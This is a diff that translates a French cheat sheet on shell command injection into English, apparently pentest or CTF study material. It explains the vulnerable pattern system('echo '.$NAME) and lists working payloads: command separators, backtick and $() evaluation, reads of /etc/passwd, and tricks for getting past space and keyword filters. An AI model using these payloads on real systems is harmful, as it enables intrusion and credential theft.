@@ -1,62 +1,74 @@
+
+
+<!--- category: cmdinjection --->
 <!--- id: intro --->
-<!--- category: cmdinjection --->
-# Injection de commandes Shell
-
-L'injection de commande Shell est possible quand un programme utilise une donnée, entrée par l'utilisateur, sans la filtrer, comme argument d'une commande shell.
-
-Par exemple: un formulaire permet de saisir son nom et l'afficher.
-Le code coté serveur va ressembler à: system ('echo '.$NAME);
-Si nous saisissons: YOLO; cat /etc/password;
-Le serveur va enchainer les deux commandes en executant system ('echo YOLO; cat /etc/password;'); et nous permettre de récupérer le contenu du fichier passwd.
-
-<!--- id: CommandPrinciple --->
-<!--- category: cmdinjection --->
+<!--- title: Shell commands injection --->
 <!--- keywords:  --->
-## Command Injection: Principe
+## Shell commands injection
 
-L'injection de commande Shell est possible quand un programme utilise une donnée, entrée par l'utilisateur, sans la filtrer, comme argument d'une commande shell.
+Shell command injection is possible when a program uses a data, entered by the user, without filtering it, as an argument of a shell command.
 
-Par exemple: un formulaire permet de saisir son nom et l'afficher.
-Le code coté serveur va ressembler à: 
+For example: a form allows to enter its name and display it.
+The server-side code will look like: system ('echo '.$NAME);
+If we enter: YOLO; cat /etc/password;
+The server will chain the two commands by executing system ('echo YOLO; cat /etc/password;'); and allow us to retrieve the content of the passwd file.
+
+
+<!--- category: cmdinjection --->
+<!--- id: CommandPrinciple --->
+<!--- title: Command Injection: Principle --->
+<!--- keywords:  --->
+## Command Injection: Principle
+
+Shell command injection is possible when a program uses a data, entered by the user, without filtering it, as an argument of a shell command.
+
+Example: You enter your name in a Web Form, your name is sent to the server then used in a shell command.
+The server-side code looks like: 
 ```
 system ('echo '.$NAME);
 ```
  
-Si nous saisissons: 
+Instead of just entering Yolo, you enter: 
 ```
 YOLO; cat /etc/password;
 ```
  
-Le serveur va enchainer les deux commandes en executant:
+The server will chain the two commands by executing:
 ```
 system ('echo YOLO; cat /etc/password;'); 
 ```
  
-Nous allons récupérer le contenu du fichier passwd.
+It is then possible to dump the content of the passwd file.
 
-Avec une injection de commande nous avons la main sur le serveur.
-Nous pouvons récupérer des informations sur le serveur (uname -a), recupérer des noms de comptes (cat /etc/passwd), récupérer les fichiers de config du serveur web, lancer un reverse shell...
+A command injection gives full control over the server.
+One can retrieve informations about the server (uname -a), account names (cat /etc/passwd), web server config files, launch a reverse shell...
 
-<!--- id: CommandChainUx --->
+
+
 <!--- category: cmdinjection --->
+<!--- id: CommandChainUx --->
+<!--- title: Unix: Chaining shell commands --->
 <!--- keywords:  --->
-## Unix: Enchainer deux commandes shell
+## Unix: Chaining shell commands
 
-Utiliser les séparateurs de commandes ; && | ||
+Commands separators are : ; && | ||
 ```
-echo YOLO; cat /etc/passwd
+echo YOLO; uname -a; cat /etc/passwd
 echo YOLO && cat /etc/passwd
 echo YOLO | cat /etc/passwd
-echo YOLO || cat /etc/passwd    Seulement si la première commande est en echec
+echo YOLO || cat /etc/passwd    Only if the first cmd fail
 ```
  
 
-<!--- id: CommandEvalUx --->
+
+
 <!--- category: cmdinjection --->
+<!--- id: CommandEvalUx --->
+<!--- title: Unix: Force command execution in a string --->
 <!--- keywords:  --->
 ## Unix: Force command execution in a string
 
-Il est possible de forcer l'execution d'une commande avec ` $ et {
+To force command execution in a string let use ` $ or {
 ```
 echo `cat /etc/passwd`
 echo $(cat /etc/passwd)
@@ -64,12 +76,16 @@ echo {cat,/etc/passwd}
 ```
  
 
-<!--- id: CommandSpaceFilteres --->
-<!--- category: cmdinjection --->
-<!--- keywords:  --->
-## Bypass: Les espaces sont filtrés
 
-Les développeurs peuvent avoir mis des filtres pour empécher l'execution de commande. Par exemple retirer les espaces. Néanmoins, même sans espaces, il est toujours possible de lancer lancer des commandes:
+
+<!--- category: cmdinjection --->
+<!--- id: CommandSpaceFilteres --->
+<!--- title: Bypass: Spaces are filtered --->
+<!--- keywords:  --->
+## Bypass: Spaces are filtered
+
+Developpers sometimes add filters to avoid command injection. For exemple, they could filter Spaces.
+Hopefully, even without spaces it's still possible to launch shell commands:
 ```
 cat&lt;/etc/passwd
 {cat,/etc/passwd}
@@ -77,12 +93,15 @@ X=$'cat\x20/etc/passwd'&&$X
 ```
  
 
-<!--- id: CommandBlacklist --->
-<!--- category: cmdinjection --->
-<!--- keywords:  --->
-## Bypass: Certains mot clefs sont filtrés
 
-Si un filtre recherche une liste de commandes, il est toujours possible de le contourner: simple quote, double quote, backslash et slash
+
+<!--- category: cmdinjection --->
+<!--- id: CommandBlacklist --->
+<!--- title: Bypass: Some keywords are filtered --->
+<!--- keywords:  --->
+## Bypass: Some keywords are filtered
+
+A keyword based filter is easy to bypass using simple quote, double quote, backslash and slash
 ```
 c'a't /etc/passwd
 cat /etc/passwd
@@ -90,8 +109,7 @@ c\at /etc/passwd
 who``ami
 ```
  
-Et si un nom de fichier est filtré, il est possible de multiplier les /
-Filtre sur cat et /etc/passwd
+In case the file '/etc/passwd' is filtered, just add /
 ```
 c\at /etc////////passwd
 ```
